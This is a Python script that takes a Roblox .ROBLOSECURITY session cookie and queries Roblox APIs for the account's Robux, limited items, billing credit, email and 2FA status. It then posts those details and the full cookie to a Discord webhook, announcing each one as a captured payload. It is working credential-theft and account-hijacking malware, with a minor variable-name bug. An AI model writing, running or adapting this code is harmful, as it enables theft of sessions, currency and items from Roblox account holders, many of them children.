import sys
import base64
import os
import urllib.request
import urllib.error
import json
import re
import time
from datetime import datetime, timezone

def safe_get(url, headers=None):
    try:
        req = urllib.request.Request(url, headers=headers or {'User-Agent': 'Roblox/WinINet'})
        with urllib.request.urlopen(req, timeout=10) as res:
            if res.status == 200:
                return json.loads(res.read().decode('utf-8'))
    except Exception:
        pass
    return None

def main():
    try:
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            sys.exit(1)

        if len(sys.argv) < 2:
            sys.exit(1)
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception:
            decoded_script = sys.argv[1]

        roblosecurity = decoded_script.strip()
        cookie_match = re.search(r'(_\|WARNING:[^"\']+)', roblosecurity)
        if cookie_match:
            roblosecurity = cookie_match.group(1)

        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Roblox/WinINet",
            "Referer": "https://www.roblox.com/",
            "Origin": "https://www.roblox.com/",
            "Accept": "application/json, text/plain, */*"
        }

        user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
        
        username = "Unknown"
        display_name = "Unknown"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired"
        robux_balance = 0
        pending_robux = 0
        account_age_days = 0
        banned = False
        
        total_rap = 0
        limiteds_count = 0
        
        has_korblox = False
        has_headless = False

        games_count = 0
        total_visits = 0
        groups_count = 0
        
        credit_balance = 0
        email_verified = False
        two_step_enabled = False
        premium_status = "False"

        if user_data and "id" in user_data:
            username = user_data.get("name", "Unknown")
            display_name = user_data.get("displayName", username)
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"

            user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers)
            if user_info:
                banned = user_info.get("isBanned", False)
                if "created" in user_info:
                    try:
                        created_dt = datetime.fromisoformat(user_info["created"].replace("Z", "+00:00"))
                        account_age_days = (datetime.now(timezone.utc) - created_dt).days
                    except Exception:
                        pass

            # 1. Robux Balance
            economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
            if economy_data:
                robux_balance = economy_data.get("robux", 0)

            # 2. Pending Robux (v2 transaction totals)
            totals_data = safe_get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?transactionType=summary", headers)
            if totals_data:
                pending_robux = totals_data.get("pendingRobux", 0)

            # 3. Collectibles & RAP
            cursor = ""
            for _ in range(5):
                col_url = f"https://inventory.roblox.com/v2/users/{user_id}/inventory/collectibles?limit=100&sortOrder=Asc"
                if cursor:
                    col_url += f"&cursor={cursor}"
                collectibles_data = safe_get(col_url, headers)
                if not collectibles_data or "data" not in collectibles_data:
                    break
                for item in collectibles_data["data"]:
                    total_rap += item.get("recentAveragePrice", 0)
                    limiteds_count += 1
                cursor = collectibles_data.get("nextPageCursor")
                if not cursor:
                    break

            # 4. Korblox & Headless
            korblox_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/48545806", headers)
            if korblox_res and korblox_res.get("data"):
                has_korblox = True

            headless_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/4819740796", headers)
            if headless_res and headless_res.get("data"):
                has_headless = True

            # 5. Billing / Credit Balance
            credit_data = safe_get("https://billing.roblox.com/v1/credit", headers)
            if credit_data:
                credit_balance = credit_data.get("balance", 0)

            # 6. Email Verification Check
            email_data = safe_get("https://accountsettings.roblox.com/v1/email", headers)
            if email_data:
                email_verified = email_data.get("isVerified", False)

            # 7. 2FA Check
            two_step_data = safe_get(f"https://twostepverification.roblox.com/v1/users/{user_id}/configuration", headers)
            if two_step_data and "methods" in two_step_data:
                for method in two_step_data["methods"]:
                    if method.get("enabled"):
                        two_step_enabled = True

            # 8. Groups & Games Count
            groups_data = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", headers)
            if groups_data and "data" in groups_data:
                groups_count = len(groups_data["data"])

            games_data = safe_get(f"https://games.roblox.com/v2/users/{user_id}/games?accessFilter=Public&limit=50", headers)
            if games_data and "data" in games_data:
                for game in games_data["data"]:
                    games_count += 1
                    total_visits += game.get("placeVisits", 0)

        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
        full_cookie_display = f"```text\n{roblosecurity}\n```"
        summary_val = robuxBalance + pending_robux + total_rap

        # Rich formatted layout matching your friend's rich display structure
        payload = {
            "content": f"@everyone New Payload Captured from **{username}**!",
            "username": f"{username} | RBXDEV Bot",
            "avatar_url": avatar_thumb,
            "embeds": [
                {
                    "title": "📢 **Discord Notification** 📢",
                    "color": 3447003,
                    "thumbnail": { "url": avatar_thumb },
                    "fields": [
                        {
                            "name": "🤖 **Username**",
                            "value": f"```\n{username}\n```",
                            "inline": False
                        },
                        {
                            "name": "📊 **Account Stats**",
                            "value": f"```ini\n+ Account Age: {account_age_days} Days\n+ Game Visits: {total_visits}\n+ Group Members: {groups_count}\n```",
                            "inline": False
                        },
                        {
                            "name": "🪙 **Economy Section**",
                            "value": f"```ini\n[ Robux ]\nBalance: {robuxBalance:,}\nPending: {pending_robux:,}\n\n[ Limiteds ]\nRAP: {total_rap:,}\nLimiteds: {limiteds_count}\n\n[ Summary ]\n{summary_val:,}\n```",
                            "inline": False
                        },
                        {
                            "name": "📂 **Account Information**",
                            "value": f"```ini\n[ Payments ]\n- Paid: False\nCredit: {credit_balance:.2f} USD\n\n[ Settings ]\n+ Email: {'Verified' if email_verified else 'Unverified'}\n+ 2FA: {'Set' if two_step_enabled else 'Not Set'}\n```",
                            "inline": False
                        },
                        {
                            "name": "🎒 **Items & Inventory**",
                            "value": f"```ini\n+ Korblox: {str(has_korblox)}\n- Headless: {str(has_headless)}\n```",
                            "inline": False
                        },
                        {
                            "name": "📊 **Status**",
                            "value": f"`{cookie_status}`",
                            "inline": False
                        }
                    ],
                    "footer": { "text": f"RBXDEV Telemetry Engine • {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}" }
                },
                {
                    "title": "🔑 **Full Captured Cookie / Payload:**",
                    "description": full_cookie_display,
                    "color": 3447003
                }
            ]
        }

        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(
            webhook_url, data=data,
            headers={'Content-Type': 'application/json', 'User-Agent': 'Roblox/WinINet'}
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            pass

    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    main()
